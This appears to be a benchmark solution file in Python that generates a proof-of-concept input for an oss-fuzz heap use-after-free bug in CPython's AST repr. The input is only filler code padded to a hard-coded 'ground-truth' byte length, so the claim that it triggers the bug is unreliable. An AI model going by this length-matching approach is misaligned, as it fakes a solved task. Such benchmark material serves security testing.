import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the AST repr() heap use-after-free bug.
        """
        mode = self._detect_python_input_mode(src_path)
        target_len = 274773  # ground-truth PoC length

        if mode == "eval":
            return self._generate_python_eval_poc(target_len)
        else:
            # Default to exec/file_input style module code
            return self._generate_python_exec_poc(target_len)

    def _detect_python_input_mode(self, src_path):
        """
        Try to detect whether the fuzz target compiles input as eval or exec/file.
        Looks for LLVMFuzzerTestOneInput and Py_*_input usage in C/C++ sources.
        Returns "eval", "exec", or None (unknown).
        """
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None

        mode = None
        try:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name.lower()
                if not (
                    name.endswith(".c")
                    or name.endswith(".cc")
                    or name.endswith(".cpp")
                    or name.endswith(".cxx")
                    or name.endswith(".c++")
                ):
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    # Read at most 1MB from each file to keep this cheap
                    data = f.read(1024 * 1024).decode("utf-8", errors="ignore")
                finally:
                    f.close()

                if (
                    "LLVMFuzzerTestOneInput" not in data
                    and "LLVMFuzzerTestOneInputWithArgs" not in data
                ):
                    continue

                # Now we are likely in a fuzz harness file
                if "Py_eval_input" in data:
                    mode = "eval"
                    break
                if "Py_file_input" in data or "Py_single_input" in data:
                    if mode is None:
                        mode = "exec"
        finally:
            tf.close()

        return mode

    def _generate_python_exec_poc(self, target_len: int) -> bytes:
        """
        Generate a large Python module (exec/file_input mode) with many assignments,
        tuned to reach exactly target_len bytes by padding with a trailing comment.
        """
        # Reserve 1 byte for at least one '#' if needed
        body_target = max(0, target_len - 1)

        lines = []
        total = 0
        i = 0

        header = "# PoC for oss-fuzz issue 368076875: heap-use-after-free in AST repr\n"
        if len(header) <= body_target:
            lines.append(header)
            total += len(header)

        # Add many simple assignment statements until close to body_target
        while True:
            line = f"x{i} = {i}\n"
            line_len = len(line)
            if total + line_len > body_target:
                break
            lines.append(line)
            total += line_len
            i += 1

        program = "".join(lines)

        # Ensure last character before padding is a newline so that a following '#'
        # starts a fresh comment line.
        if not program or program[-1] != "\n":
            if len(program) < target_len:
                program += "\n"

        if len(program) < target_len:
            rem = target_len - len(program)
            # Append a single (possibly very long) comment; any number of '#' is valid.
            program += "#" * rem
        elif len(program) > target_len:
            # Extremely unlikely given the construction, but truncate defensively.
            program = program[:target_len]

        return program.encode("ascii", errors="ignore")

    def _generate_python_eval_poc(self, target_len: int) -> bytes:
        """
        Generate a large Python expression (eval mode) as a big list literal,
        then pad with a trailing comment to hit exactly target_len bytes.
        """
        # Need at least "[]" plus one char of padding
        body_target = max(2, target_len - 1)

        parts = ["["]
        total = 1  # '['
        i = 0
        sep = ""

        # Build a wide list: [0,1,2,...] as long as it stays within body_target.
        while True:
            item = f"{sep}{i}"
            item_len = len(item)
            # Plus closing ']'
            if total + item_len + 1 > body_target:
                break
            parts.append(item)
            total += item_len
            sep = ","
            i += 1

        parts.append("]")
        total += 1  # closing ']'

        expr = "".join(parts)

        # Ensure newline before trailing comment if possible
        if expr and expr[-1] != "\n":
            if len(expr) < target_len:
                expr += "\n"

        if len(expr) < target_len:
            rem = target_len - len(expr)
            expr += "#" * rem
        elif len(expr) > target_len:
            expr = expr[:target_len]

        return expr.encode("ascii", errors="ignore")